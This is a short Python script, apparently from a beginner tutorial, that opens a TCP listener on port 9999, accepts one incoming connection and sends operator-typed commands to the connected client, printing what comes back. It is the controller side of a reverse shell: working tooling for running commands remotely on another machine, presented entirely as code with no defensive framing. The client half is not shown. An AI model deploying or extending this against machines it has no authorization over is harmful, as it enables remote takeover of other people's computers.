
# Importing libraries that are needed
import socket
import sys

# Create a socket that enables you to communicate

def socket_create():
    try:
        global host
        global port
        global server
        host = ''
        port = 9999
        server = socket.socket()

    except socket.error as msg:
        print("Socket Error:" + str(msg))

# Bind Socket and wait for connection for client

def socket_bind():
    try:
        global host
        global port
        global server
        print("Binding Scoket to port: " + str(port))
        server.bind((host,port))
        server.listen(5)

    except socket.error as msg:
        print("Socket Biding Error! " + str(msg)+ "\n" + "Retrying....")
        socket_bind()


# Establish a connection with client

def socket_accept():
    client, address = server.accept()
    print("Connection has been established \n IP: "+ address[0] + " Port: "+ str(address[1]))
    send_commands(client)
    client.close()


def send_commands(client):
    while(True):
        cmd = input(">")
        if(cmd == 'quit'):
            client.close()
            server.close()
            sys.exit()

        if(len(str.encode(cmd)) > 0 ):
            client.send(str.encode(cmd))
            client_response = str(client.recv(1024),"utf-8")
            print(client_response,end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
